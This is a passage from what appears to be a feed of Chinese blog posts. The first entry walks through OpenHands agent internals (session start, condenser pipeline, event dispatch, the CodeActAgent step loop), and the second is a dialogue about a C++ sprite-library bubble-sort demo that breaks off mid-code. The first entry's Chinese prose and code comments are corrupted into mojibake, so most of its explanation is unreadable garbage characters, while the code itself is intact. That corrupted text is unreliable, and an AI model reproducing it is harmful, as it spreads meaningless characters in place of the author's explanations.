é€’è¿è¡Œæ—¶ä¿¡æ¯åˆ°Agenté…ç½®ï¼ˆç”¨äºŽå·¥å…·çš„è¿è¡Œæ—¶ç‰¹å®šè¡Œä¸ºï¼‰\n        agent_config.runtime = self.config.runtime\n        # èŽ·å–Agentå¯¹åº”çš„LLMé…ç½®\n        agent_name = agent_cls if agent_cls is not None else 'agent'\n        llm_config = self.config.get_llm_config_from_agent(agent_name)\n        \n        # è‹¥å¯ç”¨é»˜è®¤ä¸Šä¸‹æ–‡åŽ‹ç¼©å™¨ï¼Œé…ç½®åŽ‹ç¼©å™¨æµæ°´çº¿\n        if settings.enable_default_condenser:\n            \"\"\"\n            é»˜è®¤åŽ‹ç¼©å™¨æµæ°´çº¿åŒ…å«ä¸‰ä¸ªé˜¶æ®µï¼ˆé¡ºåºé‡è¦ï¼‰ï¼š\n            1. å¯¹è¯çª—å£åŽ‹ç¼©å™¨ï¼šå¤„ç†æ˜¾å¼çš„åŽ‹ç¼©è¯·æ±‚\n            2. æµè§ˆå™¨è¾“å‡ºåŽ‹ç¼©å™¨ï¼šé™åˆ¶æµè§ˆå™¨è§‚å¯Ÿç»“æžœçš„å¤§å°ï¼ˆæ³¨æ„åŠ›çª—å£=2ï¼‰\n            3. LLMæ€»ç»“åŽ‹ç¼©å™¨ï¼šé™åˆ¶ä¼ é€’ç»™LLMçš„ä¸Šä¸‹æ–‡å¤§å°\n            é¡ºåºè®¾è®¡åŽŸå› ï¼šå…ˆå¤„ç†æµè§ˆå™¨è¾“å‡ºï¼Œå¯å‡å°‘æ€»ç»“æˆæœ¬ï¼ˆä»…ä¿ç•™æœ€æ–°æµè§ˆå™¨è¾“å‡ºï¼‰\n            \"\"\"\n            max_events_for_condenser = settings.condenser_max_size or 120  # åŽ‹ç¼©å™¨æœ€å¤§äº‹ä»¶æ•°ï¼ˆé»˜è®¤120ï¼‰\n            default_condenser_config = CondenserPipelineConfig(\n                condensers=[\n                    ConversationWindowCondenserConfig(),\n                    BrowserOutputCondenserConfig(attention_window=2),\n                    LLMSummarizingCondenserConfig(\n                        llm_config=llm_config,\n                        keep_first=4,  # ä¿ç•™å‰4ä¸ªäº‹ä»¶ï¼ˆä¸åŽ‹ç¼©ï¼‰\n                        max_size=max_events_for_condenser,  # åŽ‹ç¼©åŽæœ€å¤§äº‹ä»¶æ•°\n                    ),\n                ]\n            )\n\n            agent_config.condenser = default_condenser_config\n        \n        # 9. åˆ›å»ºAgentå®žä¾‹ï¼ˆé€šè¿‡Agentå·¥åŽ‚æ–¹æ³•èŽ·å–å¯¹åº”ç±»åž‹çš„Agentç±»ï¼‰\n        agent = Agent.get_cls(agent_cls)(agent_config, self.llm_registry)\n\n        # 10. ç»‘å®šLLMé‡è¯•ç›‘å¬å™¨ï¼ˆAgentä¼šè¯ä¸­LLMé‡è¯•æ—¶è§¦å‘é€šçŸ¥ï¼‰\n        self.llm_registry.retry_listener = self._notify_on_llm_retry\n\n        # 11. æå–ConversationInitDataç±»åž‹è®¾ç½®ä¸­çš„æ‰©å±•å‚æ•°ï¼ˆè‹¥é€‚ç”¨ï¼‰\n        git_provider_tokens = None  # Gitæä¾›å•†ä»¤ç‰Œï¼ˆç”¨äºŽä»£ç ä»“åº“è®¿é—®ï¼‰\n        selected_repository = None  # é€‰ä¸­çš„ä»£ç ä»“åº“\n        selected_branch = None  # é€‰ä¸­çš„ä»“åº“åˆ†æ”¯\n        custom_secrets = None  # è‡ªå®šä¹‰å¯†é’¥ï¼ˆç”¨äºŽç¬¬ä¸‰æ–¹æœåŠ¡è®¿é—®ï¼‰\n        conversation_instructions = None  # ä¼šè¯æŒ‡ä»¤ï¼ˆè‡ªå®šä¹‰Agentè¡Œä¸ºï¼‰\n        if isinstance(settings, ConversationInitData):\n            git_provider_tokens = settings.git_provider_tokens\n            selected_repository = settings.selected_repository\n            selected_branch = settings.selected_branch\n            custom_secrets = settings.custom_secrets\n            conversation_instructions = settings.conversation_instructions\n\n        # 12. å¯åŠ¨Agentä¼šè¯ï¼ˆæ ¸å¿ƒæ­¥éª¤ï¼‰\n        try:\n            await self.agent_session.start(\n                runtime_name=self.config.runtime,  # è¿è¡Œæ—¶åç§°ï¼ˆå¦‚æ²™ç›’ç±»åž‹ï¼‰\n                config=self.config,  # å®Œæ•´é…ç½®\n                agent=agent,  # Agentå®žä¾‹\n                max_iterations=max_iterations,  # æœ€å¤§è¿­ä»£æ¬¡æ•°\n                max_budget_per_task=max_budget_per_task,  # å•ä»»åŠ¡æœ€å¤§é¢„ç®—\n                agent_to_llm_config=self.config.get_agent_to_llm_config_map(),  # Agent-LLMé…ç½®æ˜ å°„\n                agent_configs=self.config.get_agent_configs(),  # æ‰€æœ‰Agenté…ç½®\n                git_provider_tokens=git_provider_tokens,  # Gitä»¤ç‰Œ\n                custom_secrets=custom_secrets,  # è‡ªå®šä¹‰å¯†é’¥\n                selected_repository=selected_repository,  # é€‰ä¸­ä»“åº“\n                selected_branch=selected_branch,  # é€‰ä¸­åˆ†æ”¯\n                initial_message=initial_message,  # åˆå§‹ç”¨æˆ·æ¶ˆæ¯\n                conversation_instructions=conversation_instructions,  # ä¼šè¯æŒ‡ä»¤\n                replay_json=replay_json,  # ä¼šè¯å›žæ”¾æ•°æ®\n            )\n        except MicroagentValidationError as e:\n            # å¾®AgentéªŒè¯é”™è¯¯ï¼šè¾“å‡ºè¯¦ç»†é”™è¯¯ä¿¡æ¯ï¼ˆå¸®åŠ©ç”¨æˆ·æŽ’æŸ¥é…ç½®é—®é¢˜ï¼‰\n            return\n        except ValueError as e:\n            # å€¼é”™è¯¯ï¼šåŒºåˆ†å¾®Agentç›¸å…³é”™è¯¯å’Œæ™®é€šå€¼é”™è¯¯\n            self.logger.exception(f\"åˆ›å»ºAgentä¼šè¯å¤±è´¥: {e}\")\n            error_message = str(e)\n            return\n        except Exception as e:\n            # å…¶ä»–æœªçŸ¥é”™è¯¯ï¼šä»…è¾“å‡ºé”™è¯¯ç±»åž‹ï¼ˆé¿å…æ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼‰\n\n            return\n\n</code></pre>\n<h3 id=\"24-ç”¨æˆ·äº¤äº’oh_user_actioné€»è¾‘\">2.4 ç”¨æˆ·äº¤äº’(oh_user_action)é€»è¾‘</h3>\n<h4 id=\"241-ç”¨æˆ·å‘æ¶ˆæ¯\">2.4.1 ç”¨æˆ·å‘æ¶ˆæ¯</h4>\n<p>å½“ç”¨æˆ·å‘æ¶ˆæ¯ï¼Œå°±æ˜¯é€šè¿‡<code>socket</code>åœ¨ oh_user_action å‡½æ•°é€šè¿‡<code>conversation_manager</code>å‘äº‹ä»¶ä¸­å¿ƒä¸­æ·»åŠ ä¸€æ¡äº‹ä»¶ã€‚ä»£ç ä½äºŽ openhands\\server\\listen_socket.pyã€‚</p>\n<pre><code class=\"language-python\">@sio.event\nasync def oh_user_action(connection_id: str, data: dict[str, Any]) -&gt; None:\n    await conversation_manager.send_to_event_stream(connection_id, data)\n\n\n</code></pre>\n<p>æ—§API ä¼šè°ƒç”¨åˆ°è¿™é‡Œã€‚</p>\n<pre><code class=\"language-python\">@sio.event\nasync def oh_action(connection_id: str, data: dict[str, Any]) -&gt; None:\n    # TODO: Remove this handler once all clients are updated to use oh_user_action\n    # Keeping for backward compatibility with in-progress sessions\n    await conversation_manager.send_to_event_stream(connection_id, data)\n\n\n</code></pre>\n<h4 id=\"242-äº‹ä»¶æ·»åŠ \">2.4.2 äº‹ä»¶æ·»åŠ </h4>\n<p>send_to_event_stream ä½äºŽ openhands\\server\\conversation_manager\\standalone_conversation_manager.pyã€‚æœ€ç»ˆè°ƒç”¨åˆ° session.dispatch å‘äº‹ä»¶æµå‘é€äº‹ä»¶ã€‚</p>\n<pre><code class=\"language-python\">    async def send_to_event_stream(self, connection_id: str, data: dict):\n        # If there is a local session running, send to that\n        sid = self._local_connection_id_to_session_id.get(connection_id)\n        if not sid:\n            raise RuntimeError(f'no_connected_session:{connection_id}')\n        await self.send_event_to_conversation(sid, data)\n\n    async def send_event_to_conversation(self, sid: str, data: dict):\n        session = self._local_agent_loops_by_sid.get(sid)\n        if not session:\n            raise RuntimeError(f'no_conversation:{sid}')\n        await session.dispatch(data)\n\n</code></pre>\n<p>dispatch ä»£ç å¦‚ä¸‹ã€‚</p>\n<pre><code class=\"language-python\">async def dispatch(self, data: dict) -&gt; None:\n    # ...\n    self.agent_session.event_stream.add_event(event, EventSource.USER)\n\n</code></pre>\n<h4 id=\"243-äº‹ä»¶å¤„ç†\">2.4.3 äº‹ä»¶å¤„ç†</h4>\n<p>å½“ä¸€æ¡äº‹ä»¶è¢«åŠ å…¥ç³»ç»Ÿçš„äº‹ä»¶æµåŽï¼Œç©¶ç«Ÿä¼šè§¦å‘å“ªäº›æ¨¡å—çš„å“åº”ï¼Ÿè¦è§£ç­”è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ¢³ç†ç³»ç»Ÿä¸­å·²è®¢é˜…äº‹ä»¶æµçš„æ ¸å¿ƒæ¨¡å— â€”â€” å®ƒä»¬å°±åƒæ—¶åˆ»å¾…å‘½çš„æŽ¥æ”¶è€…ï¼Œå„è‡ªå®ˆåœ¨ä¸“å±žçš„æ¶ˆæ¯é€šé“æ—ï¼šSession æ¨¡å—è®¢é˜…äº† SERVER é€šé“ï¼ŒRuntime æ¨¡å—å¯¹åº” RUNTIME é€šé“ï¼ŒMemory æ¨¡å—ç›‘å¬ç€ MEMORY é€šé“ï¼Œè€Œ AgentController æ¨¡å—åˆ™èšç„¦äºŽ AGENT_CONTROLLER é€šé“ã€‚</p>\n<p>å½“ç”¨æˆ·å‘é€ä¸€æ¡æ¶ˆæ¯å¹¶è¿›å…¥äº‹ä»¶æµåŽï¼Œè¿™æ¡æ¶ˆæ¯ä¼šä»¥å¹¿æ’­çš„å½¢å¼æ‰©æ•£åˆ°æ‰€æœ‰è®¢é˜…é€šé“ï¼Œå„ä¸ªæ¨¡å—ä¼šé€šè¿‡é¢„å…ˆæ³¨å†Œçš„å›žè°ƒå‡½æ•°å¯åŠ¨ç›¸åº”å¤„ç†æµç¨‹ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>\n<p>AgentController æ¨¡å—ä¼šåœ¨ _on_event å‡½æ•°é‡Œé¢å¤„ç†ã€‚</p>\n<pre><code class=\"language-python\">    async def _on_event(self, event: Event) -&gt; None:\n        if hasattr(event, 'hidden') and event.hidden:\n            return\n\n        self.state_tracker.add_history(event)\n\n        if isinstance(event, Action):\n            await self._handle_action(event)\n        elif isinstance(event, Observation):\n            await self._handle_observation(event)\n\n        should_step = self.should_step(event)\n        if should_step:\n            self.log(\n                'debug',\n                f'Stepping agent after event: {type(event).__name__}',\n                extra={'msg_type': 'STEPPING_AGENT'},\n            )\n            await self._step_with_exception_handling()\n        elif isinstance(event, MessageAction) and event.source == EventSource.USER:\n            # If we received a user message but aren't stepping, log why\n            self.log(\n                'warning',\n                f'Not stepping agent after user message. Current state: {self.get_agent_state()}',\n                extra={'msg_type': 'NOT_STEPPING_AFTER_USER_MESSAGE'},\n            )\n\n</code></pre>\n<p>_handle_action ä¼šè°ƒç”¨  _handle_message_actionã€‚</p>\n<pre><code class=\"language-python\">    async def _handle_action(self, action: Action) -&gt; None:\n        \"\"\"Handles an Action from the agent or delegate.\"\"\"\n        if isinstance(action, ChangeAgentStateAction):\n            await self.set_agent_state_to(action.agent_state)  # type: ignore\n        elif isinstance(action, MessageAction):\n            await self._handle_message_action(action)\n        elif isinstance(action, AgentDelegateAction):\n            await self.start_delegate(action)\n            assert self.delegate is not None\n            # Post a MessageAction with the task for the delegate\n            if 'task' in action.inputs:\n                self.event_stream.add_event(\n                    MessageAction(content='TASK: ' + action.inputs['task']),\n                    EventSource.USER,\n                )\n                await self.delegate.set_agent_state_to(AgentState.RUNNING)\n            return\n\n        elif isinstance(action, AgentFinishAction):\n            self.state.outputs = action.outputs\n            await self.set_agent_state_to(AgentState.FINISHED)\n        elif isinstance(action, AgentRejectAction):\n            self.state.outputs = action.outputs\n            await self.set_agent_state_to(AgentState.REJECTED)\n\n</code></pre>\n<p>_handle_message_action ä¸­ï¼ŒAgentController æ¨¡å—ä¼šç”Ÿæˆä¸€æ¡ RecallAction äº‹ä»¶å¹¶å†æ¬¡æŽ¨å…¥äº‹ä»¶æµï¼Œè¯¥äº‹ä»¶çš„ç±»åž‹ä¼šæ ¹æ®å½“å‰æ˜¯å¦ä¸ºç”¨æˆ·é¦–æ¬¡è¾“å…¥æ¥åˆ¤å®šï¼šè‹¥æ˜¯é¦–æ¬¡è¾“å…¥åˆ™è®¾ä¸º RecallType.WORKSPACE_CONTEXTï¼Œåä¹‹åˆ™è®¾ä¸º RecallType.KNOWLEDGEï¼›</p>\n<pre><code class=\"language-python\">    async def _handle_message_action(self, action: MessageAction) -&gt; None:\n        \"\"\"Handles message actions from the event stream.\n\n        Args:\n            action (MessageAction): The message action to handle.\n        \"\"\"\n        if action.source == EventSource.USER:\n            # Use info level if LOG_ALL_EVENTS is set\n            log_level = (\n                'info' if os.getenv('LOG_ALL_EVENTS') in ('true', '1') else 'debug'\n            )\n            self.log(\n                log_level,\n                str(action),\n                extra={'msg_type': 'ACTION', 'event_source': EventSource.USER},\n            )\n\n            # if this is the first user message for this agent, matters for the microagent info type\n            first_user_message = self._first_user_message()\n            is_first_user_message = (\n                action.id == first_user_message.id if first_user_message else False\n            )\n            recall_type = (\n                RecallType.WORKSPACE_CONTEXT\n                if is_first_user_message\n                else RecallType.KNOWLEDGE\n            )\n\n            recall_action = RecallAction(query=action.content, recall_type=recall_type)\n            self._pending_action = recall_action\n            # this is source=USER because the user message is the trigger for the microagent retrieval\n            self.event_stream.add_event(recall_action, EventSource.USER)\n\n            if self.get_agent_state() != AgentState.RUNNING:\n                await self.set_agent_state_to(AgentState.RUNNING)\n\n        elif action.source == EventSource.AGENT:\n            # If the agent is waiting for a response, set the appropriate state\n            if action.wait_for_response:\n                await self.set_agent_state_to(AgentState.AWAITING_USER_INPUT)\n\n</code></pre>\n<p>AgentController æ¨¡å—ä¼šåœ¨ _on_event å‡½æ•°é‡Œé¢è°ƒç”¨ agent.step æ–¹æ³•ï¼Œå¯åŠ¨æ™ºèƒ½ä½“çš„æ ¸å¿ƒå¤„ç†æµç¨‹ã€‚</p>\n<p>è¿™é‡Œçš„ agent.step çš„å…·ä½“é€»è¾‘å–å†³äºŽé…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„æ™ºèƒ½ä½“ç±»åž‹ã€‚ä»¥å¸¸è§çš„ CodeActAgent ä¸ºä¾‹ï¼Œè¯¥æ–¹æ³•ä¼šæŒ‡å‘ OpenHands/openhands/agenthub/codeact_agent/codeact_agent.py ä¸­çš„ step å‡½æ•°ã€‚æœ€ç»ˆå°†æ•´ç†åŽçš„ä¿¡æ¯è½¬åŒ–ä¸ºç¬¦åˆå¤§è¯­è¨€æ¨¡åž‹è¾“å…¥æ ¼å¼çš„ messagesã€‚</p>\n<pre><code class=\"language-python\">    def step(self, state: State) -&gt; 'Action':\n        \"\"\"Performs one step using the CodeAct Agent.\n\n        This includes gathering info on previous steps and prompting the model to make a command to execute.\n\n        Parameters:\n        - state (State): used to get updated info\n\n        Returns:\n        - CmdRunAction(command) - bash command to run\n        - IPythonRunCellAction(code) - IPython code to run\n        - AgentDelegateAction(agent, inputs) - delegate action for (sub)task\n        - MessageAction(content) - Message action to run (e.g. ask for clarification)\n        - AgentFinishAction() - end the interaction\n        - CondensationAction(...) - condense conversation history by forgetting specified events and optionally providing a summary\n        - FileReadAction(path, ...) - read file content from specified path\n        - FileEditAction(path, ...) - edit file using LLM-based (deprecated) or ACI-based editing\n        - AgentThinkAction(thought) - log agent's thought/reasoning process\n        - CondensationRequestAction() - request condensation of conversation history\n        - BrowseInteractiveAction(browser_actions) - interact with browser using specified actions\n        - MCPAction(name, arguments) - interact with MCP server tools\n        \"\"\"\n        # Continue with pending actions if any\n        if self.pending_actions:\n            return self.pending_actions.popleft()\n\n        # if we're done, go back\n        latest_user_message = state.get_last_user_message()\n        if latest_user_message and latest_user_message.content.strip() == '/exit':\n            return AgentFinishAction()\n\n        # Condense the events from the state. If we get a view we'll pass those\n        # to the conversation manager for processing, but if we get a condensation\n        # event we'll just return that instead of an action. The controller will\n        # immediately ask the agent to step again with the new view.\n        condensed_history: list[Event] = []\n        match self.condenser.condensed_history(state):\n            case View(events=events):\n                condensed_history = events\n\n            case Condensation(action=condensation_action):\n                return condensation_action\n\n        initial_user_message = self._get_initial_user_message(state.history)\n        messages = self._get_messages(condensed_history, initial_user_message)\n        params: dict = {\n            'messages': messages,\n        }\n        params['tools'] = check_tools(self.tools, self.llm.config)\n        params['extra_body'] = {\n            'metadata': state.to_llm_metadata(\n                model_name=self.llm.config.model, agent_name=self.name\n            )\n        }\n        response = self.llm.completion(**params)\n        logger.debug(f'Response from LLM: {response}')\n        actions = self.response_to_actions(response)\n        logger.debug(f'Actions after response_to_actions: {actions}')\n        for action in actions:\n            self.pending_actions.append(action)\n        return self.pending_actions.popleft()\n\n\n</code></pre>\n<p>å½“å¤§è¯­è¨€æ¨¡åž‹å¤„ç†å®Œæˆå¹¶è¿”å›žç»“æžœåŽï¼Œè¯¥ç»“æžœä¼šè¢«å°è£…æˆ Action å¯¹è±¡é‡æ–°é€å…¥äº‹ä»¶æµã€‚å‡è®¾æ¨¡åž‹ç›´æŽ¥è¿”å›žäº† MessageAction ç±»åž‹çš„ç»“æžœï¼ŒSession æ¨¡å—ä¾¿ä¼šæ•èŽ·è¿™æ¡äº‹ä»¶ï¼Œå¹¶å°†å…¶ä¸­çš„å†…å®¹è½¬å‘è‡³å‰ç«¯ç•Œé¢ï¼Œå®Œæˆå‘ç”¨æˆ·çš„åé¦ˆå±•ç¤ºã€‚</p>\n<h2 id=\"0xff-å‚è€ƒ\">0xFF å‚è€ƒ</h2>\n<p><a href=\"https://docs.all-hands.dev/openhands/usage/architecture/backend\" rel=\"noopener nofollow\" target=\"_blank\">https://docs.all-hands.dev/openhands/usage/architecture/backend</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/1936485868761257658\" rel=\"noopener nofollow\" target=\"_blank\">å½“AI Agentä»Žâ€œçŽ©å…·â€èµ°å‘â€œå·¥å…·â€ï¼Œæˆ‘ä»¬è¯¥å…³æ³¨ä»€ä¹ˆï¼ŸOpenhandsæž¶æž„è§£æžã€ç¬¬äºŒç¯‡ï¼šAgent ç›¸å…³æ ¸å¿ƒæ¦‚å¿µã€‘</a>  <a href=\"https://www.zhihu.com/people/dreamrenderx\" rel=\"noopener nofollow\" target=\"_blank\">å…‹é‡Œ</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/1936175201323825087\" rel=\"noopener nofollow\" target=\"_blank\">å½“AI Agentä»Žâ€œçŽ©å…·â€èµ°å‘â€œå·¥å…·â€ï¼Œæˆ‘ä»¬è¯¥å…³æ³¨ä»€ä¹ˆï¼ŸOpenhandsæž¶æž„è§£æžã€ç¬¬ä¸€ç¯‡ï¼šç³»åˆ—å¯¼è¯»ã€‘</a> <a href=\"https://www.zhihu.com/people/dreamrenderx\" rel=\"noopener nofollow\" target=\"_blank\">å…‹é‡Œ</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/1940436682949244630\" rel=\"noopener nofollow\" target=\"_blank\">Coding Agentä¹‹Openhandsè§£æž(å«ä»£ç )</a>  <a href=\"https://www.zhihu.com/people/wu-long-ming-cha-56\" rel=\"noopener nofollow\" target=\"_blank\">Arrow</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/1940824548485347192\" rel=\"noopener nofollow\" target=\"_blank\">OpenHands æºç è§£è¯»</a>  <a href=\"https://www.zhihu.com/people/xiao-hui-66-72\" rel=\"noopener nofollow\" target=\"_blank\">ä¸€åŠ›è¾‰</a></p>\n<p><a href=\"https://adk.wiki/\" rel=\"noopener nofollow\" target=\"_blank\">https://adk.wiki/</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-02 20:54</span>&nbsp;\n<a href=\"https://www.cnblogs.com/rossiXYZ\">ç½—è¥¿çš„æ€è€ƒ</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">0</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "一个昏暗的编程教室，电脑屏幕前坐着一位程序员（你），旁边站着一位好奇的朋友。",
      "link": "https://www.cnblogs.com/lixingqiu/p/19566285",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lixingqiu/p/19566285\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 20:13\">\n    <span>一个昏暗的编程教室，电脑屏幕前坐着一位程序员（你），旁边站着一位好奇的朋友。</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><img alt=\"无标题\" class=\"lazyload\" height=\"287\" width=\"297\" /></p>\n<p>&nbsp;</p>\n<p>可以先看视频：https://www.douyin.com/video/7602172380894563636</p>\n<p>朋友：“嘿，伙计，你在干啥呢？这屏幕上一堆小球在动来动去的，是啥玩意儿？”</p>\n<p>你（推了推眼镜）：“哦，这是冒泡排序的可视化程序。你知道冒泡排序吗？”</p>\n<p>朋友：“听说过，但具体咋回事我不太清楚。”</p>\n<p>你：“那我就给你讲讲。就像这些小球一样，它们一开始是乱序的，我们要把它们从小到大排好。”</p>\n<p>朋友：“那怎么排呢？”</p>\n<p>你：“很简单，就是两两比较，如果前面的比后面的大，就交换位置。就像这样——”</p>\n<p>（你指着屏幕）</p>\n<p>“你看，第一个红球和橙球比，发现红球大，于是它们交换位置；接着橙球和黄球比……”</p>\n<p>朋友：“哦，有点像打牌时理牌的感觉。”</p>\n<p>你：“对对对！就是这么个意思。每一轮下来，最大的那个数就会‘沉’到最后面，就像气泡往上冒一样，所以叫‘冒泡排序’。”</p>\n<p>朋友：“那这些小球为啥会动啊？”</p>\n<p>你：“因为我们用了C++精灵库，每个小球都是一个‘Sprite’对象，有颜色、大小、位置等属性。每次交换的时候，我们不仅换数据，还让它们的图像也跟着移动。”</p>\n<p>朋友：“哇，还挺直观的。”</p>\n<p>你：“是啊，而且你看上面还有文字提示，说现在是第几轮，最后还会显示‘演示完毕！’”</p>\n<p>朋友：“那谁写的这个程序啊？”</p>\n<p>你（得意地笑）：“我师祖——李兴球老师。他写了这个C++精灵库，方便我们做这种动画效果。”</p>\n<p>朋友：“厉害啊！那我能不能也试试？”</p>\n<p>你：“当然可以，代码都在这儿呢，你想改多少都行。”</p>\n<hr />\n<div class=\"cnblogs_code\">\n<pre>#include <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">sprites.h</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">包含C++精灵库 </span>\n<span style=\"color: rgba(0, 0, 255, 1);\">using</span> <span style=\"color: rgba(0, 0, 255, 1);\">namespace</span><span style=\"color: rgba(0, 0, 0, 1);\"> std;\nSprite rocket;      </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">建立角色叫rocket</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> Node{\n   </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> value,x;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">值和坐标</span>\n   Sprite *<span style=\"color: rgba(0, 0, 0, 1);\">sp;\n};\nvector</span>&lt;Node *&gt;<span style=\"color: rgba(0, 0, 0, 1);\"> datas;\nvector</span>&lt;<span style=\"color: rgba(0, 0, 255, 1);\">string</span>&gt; colors = {<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">red</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">orange</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">yellow</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">green</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">,\n                         </span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">cyan</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">blue</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">purple</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">pink</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">};\n</span><span style=\"color: rgba(0, 0, 255, 1);\">void</span> swap(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> i,<span style=\"color: rgba(0, 0, 255, 1);\">int</span> j){   <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">交换两个节点</span>\n     Node *a =<span style=\"color: rgba(0, 0, 0, 1);\"> datas[i];\n     Node </span>*b =<span style=\"color: rgba(0, 0, 0, 1);\"> datas[j];   \n     </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">交换a和b的x从标，并且到达自己的坐标    </span>\n     <span style=\"color: rgba(0, 0, 255, 1);\">int</span> tempx = a-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">x;\n     a</span>-&gt;x = b-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">x;\n     b</span>-&gt;x =<span style=\"color: rgba(0, 0, 0, 1);\"> tempx;\n     a</span>-&gt;sp-&gt;go(a-&gt;x,<span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n     b</span>-&gt;sp-&gt;go(b-&gt;x,<span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n     </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">在datas中的位置也要交换</span>\n     Node *<span style=\"color: rgba(0, 0, 0, 1);\">temp ;   \n     temp </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> datas[i];\n     datas[i] </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> datas[j];\n     datas[j] </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> temp;     \n}\n</span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> main(){        <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">主功能块 </span>\n   g_screen-&gt;bgcolor(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">black</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> n= randint(<span style=\"color: rgba(128, 0, 128, 1);\">5</span>,<span style=\"color: rgba(128, 0, 128, 1);\">8</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> x = <span style=\"color: rgba(128, 0, 128, 1);\">50</span>-<span style=\"color: rgba(128, 0, 128, 1);\">100</span>*n/<span style=\"color: rgba(128, 0, 128, 1);\">2</span>;    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">最左边节点坐标(起始)</span>\n   <span style=\"color: rgba(0, 0, 255, 1);\">for</span>(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> i=<span style=\"color: rgba(128, 0, 128, 1);\">0</span>;i&lt;n;i++){    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">建立n个节点，放到datas中</span>\n      <span style=\"color: rgba(0, 0, 255, 1);\">int</span> v = randint(<span style=\"color: rgba(128, 0, 128, 1);\">30</span>,<span style=\"color: rgba(128, 0, 128, 1);\">200</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n      Node </span>*node = <span style=\"color: rgba(0, 0, 255, 1);\">new</span><span style=\"color: rgba(0, 0, 0, 1);\"> Node;\n      node</span>-&gt;value =<span style=\"color: rgba(0, 0, 0, 1);\"> v;\n      node</span>-&gt;x =<span style=\"color: rgba(0, 0, 0, 1);\"> x;\n      </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">按顺序选择索引为i的颜色，组合成角色的造型图片</span>\n      <span style=\"color: rgba(0, 0, 255, 1);\">string</span> s = <span style=\"color: rgba(128, 0, 0, 